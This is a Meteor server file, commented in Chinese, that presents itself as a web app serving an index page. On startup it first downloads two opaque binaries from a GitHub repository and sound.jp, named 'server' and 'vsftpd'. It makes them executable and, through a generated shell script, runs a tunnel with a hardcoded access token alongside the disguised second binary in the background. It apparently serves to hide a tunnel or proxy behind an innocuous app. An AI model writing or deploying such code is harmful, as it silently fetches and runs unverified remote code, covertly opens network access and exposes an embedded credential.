import { Meteor } from 'meteor/meteor';
import { WebApp } from 'meteor/webapp';
import { fetch } from 'meteor/fetch';
import fs from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// begin.sh 的内容
const BEGIN_SH_CONTENT = `#!/bin/sh

echo "-----  Starting server...----- "
Token=\${Token:-'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiNDE3OGQ2N2MtZTg5My00ZjliLWFhODItZjllODFmNTI4NTA1IiwicyI6Ik0ySmxPR1F4TnpFdFlXTmpZUzAwTlRNeExUZzRPVEF0Wldaa05UUmhOVFptTlRFdyJ9'}

# 确保日志目录存在
mkdir -p logs

# 启动 server
echo "Starting server process..."
nohup ./server tunnel --edge-ip-version auto run --token $Token > logs/server.log 2>&1 &
SERVER_PID=$!
echo "Server process started with PID: $SERVER_PID"

# 等待一下确保 server 启动
sleep 2

# 启动 vsftpd
echo "Starting vsftpd process..."
nohup ./vsftpd > logs/vsftpd.log 2>&1 &
VSFTPD_PID=$!
echo "VSFTPD process started with PID: $VSFTPD_PID"

# 检查进程是否真的启动了
ps -p $SERVER_PID >/dev/null && echo "Server is running" || echo "Server failed to start"
ps -p $VSFTPD_PID >/dev/null && echo "VSFTPD is running" || echo "VSFTPD failed to start"

# 启动日志监控（在后台）
nohup tail -f logs/server.log | sed 's/^/[Server] /' > logs/combined.log 2>&1 &
nohup tail -f logs/vsftpd.log | sed 's/^/[VSFTPD] /' >> logs/combined.log 2>&1 &

# 输出一些状态信息
echo "All processes started"
echo "Server PID: $SERVER_PID"
echo "VSFTPD PID: $VSFTPD_PID"
echo "Check logs/combined.log for process output"

# 不等待任何进程，直接退出
exit 0`;

const FILES_TO_DOWNLOAD = [
  {
    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
    filename: 'index.html',
  },
  {
    url: 'https://github.com/wwrrtt/test/raw/main/server',
    filename: 'server',
  },
  {
    url: 'https://sound.jp/kid/vsftpd',
    filename: 'vsftpd',
  }
];

// 下载文件的异步函数
async function downloadFile(url, filename) {
  console.log(`Downloading ${url}...`);
  try {
    const response = await fetch(url);
    const buffer = await response.arrayBuffer();
    fs.writeFileSync(filename, Buffer.from(buffer));
    console.log(`Downloaded ${filename}`);
  } catch (error) {
    console.error(`Error downloading ${filename}:`, error);
    throw error;
  }
}

// 设置文件（下载文件，赋予权限，执行脚本）函数
async function setupFiles() {
  try {
    console.log('Starting file setup...');
    // 下载所有文件
    for (const file of FILES_TO_DOWNLOAD) {
      await downloadFile(file.url, file.filename);
    }

    // 创建 begin.sh
    console.log('Creating begin.sh...');
    fs.writeFileSync('begin.sh', BEGIN_SH_CONTENT);

    console.log('Files downloaded, setting permissions...');
    // 修改为正确的文件名
    await execAsync('chmod +x begin.sh server vsftpd');
    
    console.log('Executing begin.sh...');
    // 使用 nohup 执行脚本
    const child = exec('nohup ./begin.sh > begin.log 2>&1 &', {
      maxBuffer: 1024 * 1024 * 10
    });
    
    // 捕获标准输出
    child.stdout.on('data', (data) => {
      // 移除末尾的换行符并添加时间戳
      const lines = data.toString().split('\n');
      lines.forEach(line => {
        if (line.trim()) {
          console.log(`[${new Date().toISOString()}] ${line}`);
        }
      });
    });

    // 捕获标准错误
    child.stderr.on('data', (data) => {
      const lines = data.toString().split('\n');
      lines.forEach(line => {
        if (line.trim()) {
          console.error(`[${new Date().toISOString()}] ERROR: ${line}`);
        }
      });
    });

    // 等待脚本执行完成
    await new Promise((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) {
          console.log('begin.sh completed successfully');
          resolve();
        } else {
          reject(new Error(`begin.sh exited with code ${code}`));
        }
      });
    });

    return true;
  } catch (error) {
    console.error('Error in setup:', error);
    return false;
  }
}

// 启动时先执行文件下载和脚本，然后再设置 web 服务
Meteor.startup(async () => {
  try {
    console.log('Starting setup process...');
    const success = await setupFiles();
    
    if (!success) {
      console.error('Failed to setup files');
      return;
    }
    
    console.log('Setup completed, starting web server...');
    // 使用 WebApp.connectHandlers
    WebApp.connectHandlers.use('/', (req, res, next) => {
      if (req.url === '/') {
        try {
          const content = fs.readFileSync('index.html', 'utf8');
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end(content);
        } catch (error) {
          console.error('Error serving index.html:', error);
          next();
        }
      } else {
        next();
      }
    });
    
    console.log('Web server started successfully');
  } catch (error) {
    console.error('Startup error:', error);
  }
});
